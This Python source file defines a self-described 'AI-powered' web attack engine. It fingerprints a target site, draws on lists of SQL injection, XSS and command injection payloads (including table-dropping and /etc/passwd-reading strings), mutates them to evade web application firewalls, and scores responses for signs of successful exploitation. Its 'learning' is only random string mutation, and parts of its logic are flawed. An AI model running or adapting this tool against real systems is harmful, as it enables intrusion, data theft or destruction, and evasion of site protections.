
import re
import random
import time
from typing import Dict, List, Any, Optional
import requests
from urllib.parse import urlparse, quote

class SmartPayloadEngine:
    """AI-powered payload adaptation engine that learns from target responses"""
    
    def __init__(self, target_url: str):
        self.target_url = target_url
        self.session = requests.Session()
        self.payload_success_history = {}
        self.target_fingerprint = {}
        self.adaptation_rules = {}
        
        # Initialize smart payload database
        self.payload_templates = {
            'sql_injection': {
                'basic': ["' OR '1'='1", "' UNION SELECT NULL--", "'; DROP TABLE--"],
                'mysql_specific': ["' AND SLEEP(5)--", "' UNION SELECT @@version--"],
                'postgresql_specific': ["'; SELECT pg_sleep(5)--", "' UNION SELECT version()--"],
                'mssql_specific': ["'; WAITFOR DELAY '00:00:05'--", "' UNION SELECT @@version--"],
                'error_based': ["' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"],
                'blind_boolean': ["' AND (SELECT SUBSTRING(@@version,1,1))='5'--", "' AND LENGTH(database())>1--"],
                'time_based': ["' AND IF(1=1,SLEEP(5),0)--", "' OR IF(1=1,SLEEP(5),0)--"]
            },
            'xss': {
                'basic': ["<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>"],
                'filter_bypass': ["<ScRiPt>alert('XSS')</ScRiPt>", "<svg/onload=alert('XSS')>"],
                'dom_based': ["javascript:alert('XSS')", "data:text/html,<script>alert('XSS')</script>"],
                'event_handlers': ["\" onmouseover=\"alert('XSS')", "' onfocus='alert('XSS')"],
                'encoded': ["%3Cscript%3Ealert('XSS')%3C/script%3E", "&#60;script&#62;alert('XSS')&#60;/script&#62;"],
                'waf_bypass': ["<iframe srcdoc=\"<script>alert('XSS')</script>\">", "<details open ontoggle=alert('XSS')>"]
            },
            'command_injection': {
                'unix': ["; whoami", "| id", "&& uname -a", "; cat /etc/passwd"],
                'windows': ["& whoami", "| dir", "&& systeminfo", "; type C:\\Windows\\System32\\drivers\\etc\\hosts"],
                'blind': ["; sleep 5", "&& ping -c 1 127.0.0.1", "| nslookup google.com"],
                'time_based': ["; sleep 10", "&& timeout 10", "| ping -c 10 127.0.0.1"]
            }
        }
        
        # Response analysis patterns
        self.response_patterns = {
            'sql_errors': [
                r'mysql.*error', r'postgresql.*error', r'ora-\d+', r'sql.*syntax',
                r'microsoft.*odbc', r'sqlite.*error', r'warning.*mysql'
            ],
            'system_info': [
                r'uid=\d+', r'linux.*version', r'windows.*version', r'darwin',
                r'microsoft windows', r'ubuntu', r'centos', r'debian'
            ],
            'file_contents': [
                r'root:x:', r'administrator:', r'/bin/bash', r'/bin/sh',
                r'127\.0\.0\.1.*localhost', r'# hosts file'
            ],
            'waf_detection': [
                r'blocked.*request', r'access.*denied', r'security.*violation',
                r'cloudflare', r'incapsula', r'akamai'
            ]
        }
    
    def fingerprint_target(self) -> Dict[str, Any]:
        """Fingerprint target to understand its characteristics"""
        fingerprint = {
            'web_server': 'unknown',
            'programming_language': 'unknown',
            'database': 'unknown',
            'waf_present': False,
            'os_type': 'unknown',
            'response_patterns': []
        }
        
        try:
            # Basic reconnaissance
            response = self.session.get(self.target_url, timeout=10)
            headers = response.headers
            content = response.text.lower()
            
            # Detect web server
            server_header = headers.get('Server', '').lower()
            if 'apache' in server_header:
                fingerprint['web_server'] = 'apache'
            elif 'nginx' in server_header:
                fingerprint['web_server'] = 'nginx'
            elif 'iis' in server_header:
                fingerprint['web_server'] = 'iis'
            
            # Detect programming language
            if 'php' in server_header or '.php' in content:
                fingerprint['programming_language'] = 'php'
            elif 'asp.net' in headers.get('X-Powered-By', '').lower():
                fingerprint['programming_language'] = 'asp.net'
            elif 'python' in server_header or 'django' in content:
                fingerprint['programming_language'] = 'python'
            
            # Detect potential WAF
            waf_headers = ['cf-ray', 'x-sucuri-id', 'x-incap-session']
            if any(header in headers for header in waf_headers):
                fingerprint['waf_present'] = True
            
            self.target_fingerprint = fingerprint
            
        except Exception as e:
            print(f"Fingerprinting failed: {e}")
        
        return fingerprint
    
    def adapt_payload(self, vuln_type: str, base_payload: str, response_history: List[Dict]) -> str:
        """Adapt payload based on previous responses and target fingerprint"""
        
        # Analyze previous responses to understand what works
        successful_patterns = []
        failed_patterns = []
        
        for response_data in response_history:
            if response_data.get('success'):
                successful_patterns.append(response_data.get('payload', ''))
            else:
                failed_patterns.append(response_data.get('payload', ''))
        
        # Start with base payload
        adapted_payload = base_payload
        
        # Apply fingerprint-based adaptations
        if vuln_type == 'sql_injection':
            adapted_payload = self._adapt_sql_payload(base_payload)
        elif vuln_type == 'xss':
            adapted_payload = self._adapt_xss_payload(base_payload)
        elif vuln_type == 'command_injection':
            adapted_payload = self._adapt_command_payload(base_payload)
        
        # Apply evasion techniques if WAF detected
        if self.target_fingerprint.get('waf_present'):
            adapted_payload = self._apply_waf_evasion(adapted_payload, vuln_type)
        
        return adapted_payload
    
    def _adapt_sql_payload(self, payload: str) -> str:
        """Adapt SQL injection payload based on target fingerprint"""
        
        # Database-specific adaptations
        if self.target_fingerprint.get('database') == 'mysql':
            # Use MySQL-specific functions
            if 'SLEEP' not in payload and 'time' in payload.lower():
                payload = payload.replace('time', 'SLEEP(5)')
            if 'version' in payload.lower():
                payload = payload.replace('version()', '@@version')
        
        elif self.target_fingerprint.get('database') == 'postgresql':
            # Use PostgreSQL-specific functions
            if 'sleep' in payload.lower():
                payload = payload.replace('SLEEP(', 'pg_sleep(')
            if 'version' in payload.lower():
                payload = payload.replace('@@version', 'version()')
        
        # Add comment variations
        comment_styles = ['--', '/*', '#', ';%00']
        for style in comment_styles:
            if style not in payload:
                payload += ' ' + style
                break
        
        return payload
    
    def _adapt_xss_payload(self, payload: str) -> str:
        """Adapt XSS payload with evasion techniques"""
        
        # Case variations
        if '<script>' in payload.lower():
            variations = ['<ScRiPt>', '<SCRIPT>', '<script >', '<script\t>']
            payload = payload.replace('<script>', random.choice(variations))
        
        # Encoding variations
        if random.choice([True, False]):
            # URL encoding
            payload = quote(payload, safe='')
        elif random.choice([True, False]):
            # HTML entity encoding
            payload = payload.replace('<', '&lt;').replace('>', '&gt;')
        
        # Event handler variations
        event_handlers = ['onload', 'onerror', 'onmouseover', 'onfocus', 'onclick']
        if 'onerror' in payload:
            payload = payload.replace('onerror', random.choice(event_handlers))
        
        return payload
    
    def _adapt_command_payload(self, payload: str) -> str:
        """Adapt command injection payload based on OS detection"""
        
        os_type = self.target_fingerprint.get('os_type', 'unknown')
        
        if 'windows' in os_type.lower():
            # Windows-specific adaptations
            payload = payload.replace('whoami', 'echo %USERNAME%')
            payload = payload.replace('id', 'whoami /all')
            payload = payload.replace('cat /etc/passwd', 'type C:\\Windows\\System32\\drivers\\etc\\hosts')
        
        else:
            # Unix-like adaptations
            payload = payload.replace('dir', 'ls -la')
            payload = payload.replace('type ', 'cat ')
        
        # Command separator variations
        separators = [';', '&&', '|', '||', '&']
        for sep in separators:
            if sep in payload:
                # Add space variations
                payload = payload.replace(sep, f' {sep} ')
                break
        
        return payload
    
    def _apply_waf_evasion(self, payload: str, vuln_type: str) -> str:
        """Apply WAF evasion techniques"""
        
        evasion_techniques = []
        
        # Case manipulation
        if vuln_type == 'xss':
            # Mixed case for tags
            payload = re.sub(r'<(\w+)', lambda m: f'<{m.group(1).capitalize()}', payload)
        
        elif vuln_type == 'sql_injection':
            # SQL keyword variations
            sql_keywords = {
                'UNION': ['UNION', 'UniOn', 'UNION ALL', '/*!UNION*/'],
                'SELECT': ['SELECT', 'SeLeCt', '/*!SELECT*/'],
                'OR': ['OR', 'Or', '||', 'OR/**/'],
                'AND': ['AND', 'AnD', '&&', 'AND/**/']
            }
            
            for keyword, variations in sql_keywords.items():
                if keyword in payload.upper():
                    payload = payload.replace(keyword, random.choice(variations))
        
        # Add comments and whitespace
        if random.choice([True, False]):
            payload = payload.replace(' ', '/**/')
        
        # Character encoding
        if random.choice([True, False]):
            payload = quote(payload, safe='')
        
        return payload
    
    def generate_smart_payloads(self, vuln_type: str, target_location: str) -> List[str]:
        """Generate smart payloads adapted for the specific target"""
        
        if vuln_type not in self.payload_templates:
            return []
        
        base_payloads = []
        payload_categories = self.payload_templates[vuln_type]
        
        # Select payloads based on target fingerprint
        for category, payloads in payload_categories.items():
            if category == 'basic':
                base_payloads.extend(payloads[:3])  # Always include basic payloads
            elif self.target_fingerprint.get('database') in category:
                base_payloads.extend(payloads)
            elif self.target_fingerprint.get('waf_present') and 'bypass' in category:
                base_payloads.extend(payloads)
        
        # Adapt each payload
        adapted_payloads = []
        for payload in base_payloads:
            adapted = self.adapt_payload(vuln_type, payload, [])
            adapted_payloads.append(adapted)
        
        return adapted_payloads
    
    def analyze_response_intelligence(self, payload: str, response: requests.Response) -> Dict[str, Any]:
        """Analyze response to gain intelligence for future payload adaptation"""
        
        analysis = {
            'success_indicators': [],
            'failure_indicators': [],
            'response_patterns': [],
            'suggested_adaptations': []
        }
        
        response_text = response.text.lower()
        
        # Check for SQL injection success
        for pattern in self.response_patterns['sql_errors']:
            if re.search(pattern, response_text):
                analysis['success_indicators'].append(f'SQL error pattern: {pattern}')
        
        # Check for command injection success
        for pattern in self.response_patterns['system_info']:
            if re.search(pattern, response_text):
                analysis['success_indicators'].append(f'System info pattern: {pattern}')
        
        # Check for WAF blocking
        for pattern in self.response_patterns['waf_detection']:
            if re.search(pattern, response_text):
                analysis['failure_indicators'].append('WAF detected')
                analysis['suggested_adaptations'].append('Apply WAF evasion techniques')
        
        # Response time analysis for blind attacks
        if hasattr(response, 'elapsed'):
            if response.elapsed.total_seconds() > 5:
                analysis['success_indicators'].append('Potential time-based vulnerability')
        
        return analysis
    
    def learn_from_response(self, payload: str, vuln_type: str, response_analysis: Dict):
        """Learn from response to improve future payload generation"""
        
        success = len(response_analysis.get('success_indicators', [])) > 0
        
        # Store in success history
        if vuln_type not in self.payload_success_history:
            self.payload_success_history[vuln_type] = []
        
        self.payload_success_history[vuln_type].append({
            'payload': payload,
            'success': success,
            'indicators': response_analysis.get('success_indicators', []),
            'timestamp': time.time()
        })
        
        # Update adaptation rules based on successful patterns
        if success:
            # Extract successful payload characteristics
            if vuln_type not in self.adaptation_rules:
                self.adaptation_rules[vuln_type] = {'successful_patterns': []}
            
            self.adaptation_rules[vuln_type]['successful_patterns'].append({
                'payload_pattern': self._extract_payload_pattern(payload),
                'success_rate': self._calculate_success_rate(vuln_type)
            })
    
    def _extract_payload_pattern(self, payload: str) -> str:
        """Extract pattern from successful payload for future use"""
        
        # Remove specific values and create pattern
        pattern = payload
        
        # Replace numbers with placeholder
        pattern = re.sub(r'\d+', 'NUM', pattern)
        
        # Replace quotes with placeholder
        pattern = re.sub(r'["\']', 'QUOTE', pattern)
        
        # Replace specific strings with placeholders
        pattern = re.sub(r'admin|test|user', 'USERNAME', pattern)
        
        return pattern
    
    def _calculate_success_rate(self, vuln_type: str) -> float:
        """Calculate success rate for vulnerability type"""
        
        if vuln_type not in self.payload_success_history:
            return 0.0
        
        history = self.payload_success_history[vuln_type]
        if not history:
            return 0.0
        
        successful = sum(1 for entry in history if entry['success'])
        return successful / len(history)
